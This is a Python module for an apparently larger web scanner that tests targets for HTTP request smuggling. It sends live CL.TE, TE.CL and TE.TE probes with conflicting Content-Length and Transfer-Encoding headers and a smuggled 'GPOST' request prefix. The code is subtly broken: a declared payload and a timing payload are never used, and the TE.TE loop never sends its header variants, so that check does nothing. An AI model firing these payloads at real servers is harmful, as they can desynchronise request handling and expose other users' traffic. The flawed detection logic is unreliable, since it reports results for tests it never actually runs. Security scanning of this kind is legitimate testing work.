import asyncio
from modules.base import BaseModule

class SmuggleModule(BaseModule):
    name = "smuggle"
    description = "HTTP Request Smuggling Scanner"
    
    async def scan(self, target):
        self.findings = []
        
        await self._test_cl_te(target)
        await self._test_te_cl(target)
        await self._test_te_te(target)
        
        return self.findings
    
    async def _test_cl_te(self, target):
        payload = (
            "POST / HTTP/1.1\r\n"
            "Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "G"
        )
        
        smuggle_body = "0\r\n\r\nGPOST / HTTP/1.1\r\nContent-Length: 10\r\n\r\nx="
        
        resp1 = await self.http.post(
            target,
            data=smuggle_body,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked",
            }
        )
        
        if resp1.get("status"):
            await asyncio.sleep(1)
            
            resp2 = await self.http.get(target)
            
            if resp2.get("status"):
                if resp2["status"] == 405 or "GPOST" in resp2.get("text", ""):
                    self.add_finding(
                        "CRITICAL",
                        "HTTP Request Smuggling (CL.TE)",
                        url=target,
                        evidence="Front-end uses Content-Length, back-end uses Transfer-Encoding"
                    )
                    return
        
        timing_payload = "0\r\n\r\n"
        
        resp = await self.http.timed_get(target)
        baseline = resp.get("elapsed", 0)
        
        smuggle_resp = await self.http.post(
            target,
            data="1\r\nZ\r\nQ",
            headers={
                "Content-Length": "4",
                "Transfer-Encoding": "chunked",
            }
        )
        
        if smuggle_resp.get("elapsed", 0) > baseline + 5:
            self.add_finding(
                "HIGH",
                "Possible HTTP Request Smuggling (CL.TE) - timing anomaly",
                url=target,
                evidence=f"Response delayed: {smuggle_resp.get('elapsed', 0):.2f}s"
            )
    
    async def _test_te_cl(self, target):
        smuggle_body = "0\r\n\r\n"
        
        resp = await self.http.post(
            target,
            data=smuggle_body,
            headers={
                "Content-Length": "3",
                "Transfer-Encoding": "chunked",
            }
        )
        
        if resp.get("status"):
            await asyncio.sleep(1)
            
            resp2 = await self.http.get(target)
            
            if resp2.get("status") in [400, 405, 500]:
                self.add_finding(
                    "MEDIUM",
                    "Possible HTTP Request Smuggling (TE.CL)",
                    url=target,
                    evidence="Back-end may use Content-Length over Transfer-Encoding"
                )
    
    async def _test_te_te(self, target):
        te_variants = [
            "Transfer-Encoding: chunked",
            "Transfer-Encoding: xchunked",
            "Transfer-Encoding : chunked",
            "Transfer-Encoding: chunked\r\nTransfer-Encoding: x",
            "Transfer-Encoding: x\r\nTransfer-Encoding: chunked",
            "Transfer-encoding: chunked",
            "Transfer-Encoding:\tchunked",
            "Transfer-Encoding: \tchunked",
            " Transfer-Encoding: chunked",
            "X: X\r\nTransfer-Encoding: chunked",
        ]
        
        for te_header in te_variants:
            try:
                resp = await self.http.request(
                    "POST",
                    target,
                    data="0\r\n\r\n",
                    headers={
                        "Content-Type": "application/x-www-form-urlencoded",
                    }
                )
                
                if resp.get("status") in [400, 500, 501]:
                    continue
                    
            except:
                pass
        
        resp = await self.http.post(
            target,
            data="0\r\n\r\n",
            headers={
                "Transfer-Encoding": "chunked",
                "Transfer-encoding": "x",
            }
        )
        
        if resp.get("status") and resp["status"] not in [400, 501]:
            self.add_finding(
                "MEDIUM",
                "Server accepts multiple Transfer-Encoding headers",
                url=target,
                evidence="May be vulnerable to TE.TE smuggling"
            )
